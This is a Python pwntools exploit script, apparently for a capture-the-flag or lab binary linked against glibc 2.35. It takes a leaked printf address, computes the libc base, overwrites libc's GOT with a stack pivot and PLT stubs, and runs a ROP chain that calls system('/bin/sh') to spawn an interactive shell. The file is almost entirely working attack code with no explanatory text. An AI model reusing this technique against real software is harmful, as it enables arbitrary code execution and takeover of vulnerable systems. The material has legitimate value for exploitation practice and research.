#!/usr/bin/env python3
# coding=utf8

import inspect
from pwn import *

context.log_level = 'debug'

cn = process('./vuln-2.35')
libc = ELF("./libc-2.35.so")

def tobytes(x): return x.encode('latin1') if isinstance(x, str) else x
def sd(x): return cn.send(tobytes(x))
def sl(x): return cn.sendline(tobytes(x))
def sa(a, b): return cn.sendafter(tobytes(a), tobytes(b))
def sla(a, b): return cn.sendlineafter(tobytes(a), tobytes(b))
def rv(x=0x1000): return cn.recv(x)
def rl(): return cn.recvline()
def ru(x): return cn.recvuntil(tobytes(x))
def raddr(): return u64(cn.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))
def raddrn(x): return u64(rv(x).ljust(8, b'\x00'))
def interact(): return cn.interactive()
def ss(s): return success(s)


def logsym(val):
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
    if m:
        varname = m.group(1)
        ss(f"{varname} => {hex(val)}")
    else:
        ss(hex(val))


############################################

context.arch = 'amd64'


class ROPgadget:
    def __init__(self, libc: ELF, base=0):
        if Path("./gadgets").exists():
            print(
                "[!] Using gadgets, make sure that's corresponding to the libc!")
        else:
            fp = open("./gadgets", 'wb')
            subprocess.run(f"ROPgadget --binary {libc.path}".split(" "),
                           stdout=fp)
            fp.close()
        fp = open("./gadgets", 'rb')
        data = fp.readlines()[2:-2]
        data = [x.strip().split(b" : ") for x in data]
        data = [[int(x[0], 16), x[1].decode()] for x in data]
        fp.close()
        self.gadgets = data
        self.base = base

    def search(self, s):
        for addr, ctx in self.gadgets:
            match = re.search(s, ctx)
            if match:
                return addr + self.base
        return None


def fx2(libc: ELF, rop_chain, nudge=0):
    got = libc.address + libc.dynamic_value_by_tag("DT_PLTGOT")
    plt0 = libc.address + libc.get_section_by_name(".plt").header.sh_addr
    rop2 = ROPgadget(libc, libc.address)
    pivot = rop2.search(r"^pop rsp ; ret")
    if not pivot:
        raise Exception("can't find pivot gadget")
    escape = rop2.search(r"^pop rsp ; .*jmp rax")
    if not escape:
        raise Exception("can't find escape gadget")
    write_dest = got + 8
    got_count = 0x36  # hardcoded
    rop_dest = write_dest + 0x10 + got_count * 8

    rop_chain2 = flat(
        rop_chain,
        escape,
        got + 0x3000 - nudge * 8,  # new rsp
    )
    write_data = flat(
        rop_dest,
        pivot,
        [plt0] * got_count,
        rop_chain2
    )
    return write_dest, write_data


leak = int(rl(), 16)
logsym(leak)
lbase = leak - libc.sym['printf']
logsym(lbase)
libc.address = lbase

rop = ROP(libc)
rdi = rop.find_gadget(["pop rdi", 'ret'])[0]
rax = rop.find_gadget(["pop rax", 'ret'])[0]
rop_chain = flat(
    rdi, libc.search(b"/bin/sh").__next__(),
    rax, libc.sym["system"]
)
dest, payload = fx2(libc, rop_chain=rop_chain, nudge=1)

ss("write payload to {}, length {}".format(hex(dest), hex(len(payload))))
sd(p64(dest))
sd(p64(len(payload)))
sd(payload)

interact()
